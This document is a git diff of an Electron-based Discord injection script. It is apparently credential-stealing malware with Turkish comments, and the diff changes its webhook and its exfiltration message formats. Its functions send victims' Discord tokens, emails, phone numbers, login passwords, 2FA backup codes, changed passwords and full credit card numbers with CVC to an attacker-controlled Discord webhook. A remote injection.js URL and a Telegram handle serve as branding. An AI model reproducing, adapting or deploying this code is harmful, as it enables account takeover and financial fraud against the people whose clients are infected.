@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1429432134304661544/ghcYkngo4NJvQqTNTF7D-ibTZMryVJARqdvlNMKMUIzJmbNFUkByo7p_tpcZIsdztJaW",
+    webhook: "https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/injection.js",
     filters: {
         urls: [
@@ -158,20 +158,9 @@ const hooker = async (content, token, account) => {
     content["username"] = "https://t.me/hairo13x7";
     content["avatar_url"] = "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&";
     
-    // Ana embed'i güncelle
-    content["embeds"][0]["author"] = {
-        "name": account.username,
-        "icon_url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
-    };
-    content["embeds"][0]["thumbnail"] = {
-        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
-    };
-    content["embeds"][0]["footer"] = {
-        "text": "https://t.me/hairo13x7",
-        "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&",
-    };
-    content["embeds"][0]["title"] = "🔐 Account Information";
-    content["embeds"][0]["timestamp"] = new Date().toISOString();
+    const avatarUrl = account.avatar
+        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=4096`
+        : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
@@ -179,60 +168,30 @@ const hooker = async (content, token, account) => {
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
-    // Detaylı bilgiler ekle
-    content["embeds"][0]["fields"].push({
-        "name": "🔑 Token",
-        "value": "```" + token + "```",
-        "inline": false
-    }, {
-        "name": "💎 Nitro",
-        "value": nitro,
-        "inline": true
-    }, {
-        "name": "🏆 Badges",
-        "value": badges,
-        "inline": true
-    }, {
-        "name": "💳 Billing",
-        "value": billing,
-        "inline": true
-    }, {
-        "name": "📧 Email",
-        "value": "`" + account.email + "`",
-        "inline": true
-    }, {
-        "name": "📱 Phone",
-        "value": "`" + (account.phone || "None") + "`",
-        "inline": true
-    }, {
-        "name": "🆔 User ID",
-        "value": "`" + account.id + "`",
-        "inline": true
-    });
-
-    // Arkadaşlar ve sunucular için ayrı embed'ler
-    content["embeds"].push({
-        "title": `👥 Friends (${friends.totalFriends})`,
-        "description": friends.message,
-        "color": 0x00ff00,
-        "footer": {
-            "text": "https://t.me/hairo13x7",
-            "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&"
-        },
-        "timestamp": new Date().toISOString()
-    }, {
-        "title": `🏰 Servers (${servers.totalGuilds})`,
-        "description": servers.message,
-        "color": 0x0099ff,
-        "footer": {
-            "text": "https://t.me/hairo13x7",
-            "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&"
-        },
-        "timestamp": new Date().toISOString()
-    });
-
-    // Ana embed rengini ayarla
+    // Ana embed'i index.js'deki gibi yap
+    content["embeds"][0]["footer"] = { 
+        text: `${os.userInfo().username} | https://t.me/hairo13x7`, 
+        icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" 
+    };
+    content["embeds"][0]["fields"] = [
+        { name: `<:mastercard_spacex:1429086506781511771> Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
+        { name: `<:badges_spacex:1429086523906850906> Badges:`, value: badges || "`No Badges`", inline: true },
+        { name: `<:mastercard_spacex:1429086506781511771> Billing:`, value: billing, inline: true },
+        { name: `<a:money_spacex:1429086508505239623> 2FA:`, value: `\`${account.mfa_enabled ? "Yes" : "No"}\``, inline: true },
+        { name: `<:email_spacex:1429086532811358350> Email:`, value: `\`${account.email}\``, inline: true },
+        { name: `<a:billing_postal:1429086529300598895> Phone:`, value: `\`${account.phone || "None"}\``, inline: true },
+    ];
     content["embeds"][0]["color"] = 0x313338;
+    content["embeds"][0]["author"] = { name: account.username, icon_url: avatarUrl };
+    content["embeds"][0]["thumbnail"] = { url: avatarUrl };
+
+    // HQ Friends embed'i ekle
+    content["embeds"].push({
+        color: 0x313338,
+        description: friends.message,
+        author: { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        footer: { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+    });
 
     await request("POST", CONFIG.webhook, {
         "Content-Type": "application/json"
@@ -353,22 +312,16 @@ const EmailPassToken = async (email, password, token, action) => {
     const content = {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
-            "title": "🔐 Login Information",
             "fields": [{
-                "name": "📧 Email",
+                "name": `<:email_spacex:1429086532811358350> Email:`,
                 "value": "`" + email + "`",
                 "inline": true
             }, {
-                "name": "🔑 Password",
+                "name": `<a:password_spacex:1429086516625412226> Password:`,
                 "value": "`" + password + "`",
                 "inline": true
-            }, {
-                "name": "🆔 User ID",
-                "value": "`" + account.id + "`",
-                "inline": true
             }],
-            "color": 0x00ff00,
-            "timestamp": new Date().toISOString()
+            "color": 0x313338
         }]
     };
 
@@ -389,24 +342,22 @@ const BackupCodesViewed = async (codes, token) => {
     const content = {
         "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
-            "title": "🔐 2FA Backup Codes",
-            "fields": [{
-                    "name": "🔑 Backup Codes",
+                "fields": [{
+                    "name": `<a:money_spacex:1429086508505239623> Backup Codes:`,
                     "value": "```" + message + "```",
                     "inline": false
                 },
                 {
-                    "name": "📧 Email",
+                    "name": `<:email_spacex:1429086532811358350> Email:`,
                     "value": "`" + account.email + "`",
                     "inline": true
                 }, {
-                    "name": "📱 Phone",
+                    "name": `<a:billing_postal:1429086529300598895> Phone:`,
                     "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }
             ],
-            "color": 0xff6b6b,
-            "timestamp": new Date().toISOString()
+            "color": 0x313338
         }]
     };
 
@@ -419,22 +370,16 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
     const content = {
         "content": `**${account.username}** just changed his password!`,
         "embeds": [{
-            "title": "🔑 Password Changed",
             "fields": [{
-                "name": "🆕 New Password",
+                "name": `<a:password_spacex:1429086516625412226> New Password:`,
                 "value": "`" + newPassword + "`",
                 "inline": true
             }, {
-                "name": "🔄 Old Password",
+                "name": `<a:password_spacex:1429086516625412226> Old Password:`,
                 "value": "`" + oldPassword + "`",
                 "inline": true
-            }, {
-                "name": "📧 Email",
-                "value": "`" + account.email + "`",
-                "inline": true
             }],
-            "color": 0xffa500,
-            "timestamp": new Date().toISOString()
+            "color": 0x313338
         }]
     };
 
@@ -447,26 +392,20 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const content = {
         "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
-            "title": "💳 Credit Card Added",
             "fields": [{
-                "name": "💳 Card Number",
+                "name": `<:visa_spacex:1429086521654509588> Card Number:`,
                 "value": "`" + number + "`",
                 "inline": true
             }, {
-                "name": "🔐 CVC",
+                "name": `<:mastercard_spacex:1429086506781511771> CVC:`,
                 "value": "`" + cvc + "`",
                 "inline": true
             }, {
-                "name": "📅 Expiration",
+                "name": `<a:billing_address:1429086525446033470> Expiration:`,
                 "value": "`" + month + "/" + year + "`",
                 "inline": true
-            }, {
-                "name": "📧 Email",
-                "value": "`" + account.email + "`",
-                "inline": true
             }],
-            "color": 0x0099ff,
-            "timestamp": new Date().toISOString()
+            "color": 0x313338
         }]
     };
 
@@ -477,24 +416,18 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
+        "content": `**${account.username}** just added a <:paypal_spacex:1429086518168784956> account!`,
         "embeds": [{
-            "title": "💰 PayPal Added",
             "fields": [{
-                "name": "📧 Email",
+                "name": `<:email_spacex:1429086532811358350> Email:`,
                 "value": "`" + account.email + "`",
                 "inline": true
             }, {
-                "name": "📱 Phone",
+                "name": `<a:billing_postal:1429086529300598895> Phone:`,
                 "value": "`" + (account.phone || "None") + "`",
                 "inline": true
-            }, {
-                "name": "🆔 User ID",
-                "value": "`" + account.id + "`",
-                "inline": true
             }],
-            "color": 0x003087,
-            "timestamp": new Date().toISOString()
+            "color": 0x313338
         }]
     };
 
@@ -508,14 +441,15 @@ const EmailChanged = async (newEmail, oldEmail, token) => {
         "content": `**${account.username}** just changed his email!`,
         "embeds": [{
             "fields": [{
-                "name": "New Email",
+                "name": `<:email_spacex:1429086532811358350> New Email:`,
                 "value": "`" + newEmail + "`",
                 "inline": true
             }, {
-                "name": "Old Email",
+                "name": `<:email_spacex:1429086532811358350> Old Email:`,
                 "value": "`" + oldEmail + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -529,14 +463,15 @@ const PhoneChanged = async (newPhone, oldPhone, token) => {
         "content": `**${account.username}** just changed his phone number!`,
         "embeds": [{
             "fields": [{
-                "name": "New Phone",
+                "name": `<a:billing_postal:1429086529300598895> New Phone:`,
                 "value": "`" + newPhone + "`",
                 "inline": true
             }, {
-                "name": "Old Phone",
+                "name": `<a:billing_postal:1429086529300598895> Old Phone:`,
                 "value": "`" + (oldPhone || "None") + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -550,14 +485,15 @@ const UsernameChanged = async (newUsername, oldUsername, token) => {
         "content": `**${oldUsername}** just changed his username!`,
         "embeds": [{
             "fields": [{
-                "name": "New Username",
+                "name": `<a:billing_name:1429086527417221120> New Username:`,
                 "value": "`" + newUsername + "`",
                 "inline": true
             }, {
-                "name": "Old Username",
+                "name": `<a:billing_name:1429086527417221120> Old Username:`,
                 "value": "`" + oldUsername + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -571,14 +507,15 @@ const NitroPurchased = async (token) => {
         "content": `**${account.username}** just purchased Nitro!`,
         "embeds": [{
             "fields": [{
-                "name": "Nitro Type",
+                "name": `<:nitro_spacex:1429086514893164647> Nitro Type:`,
                 "value": "`" + getNitro(account.premium_type) + "`",
                 "inline": true
             }, {
-                "name": "Email",
+                "name": `<:email_spacex:1429086532811358350> Email:`,
                 "value": "`" + account.email + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -592,14 +529,15 @@ const ServerJoined = async (serverName, serverId, token) => {
         "content": `**${account.username}** just joined a server!`,
         "embeds": [{
             "fields": [{
-                "name": "Server Name",
+                "name": `<:space_classic:1429086519901032610> Server Name:`,
                 "value": "`" + serverName + "`",
                 "inline": true
             }, {
-                "name": "Server ID",
+                "name": `<:space_classic:1429086519901032610> Server ID:`,
                 "value": "`" + serverId + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -613,14 +551,15 @@ const ServerLeft = async (serverName, serverId, token) => {
         "content": `**${account.username}** just left a server!`,
         "embeds": [{
             "fields": [{
-                "name": "Server Name",
+                "name": `<:space_classic:1429086519901032610> Server Name:`,
                 "value": "`" + serverName + "`",
                 "inline": true
             }, {
-                "name": "Server ID",
+                "name": `<:space_classic:1429086519901032610> Server ID:`,
                 "value": "`" + serverId + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
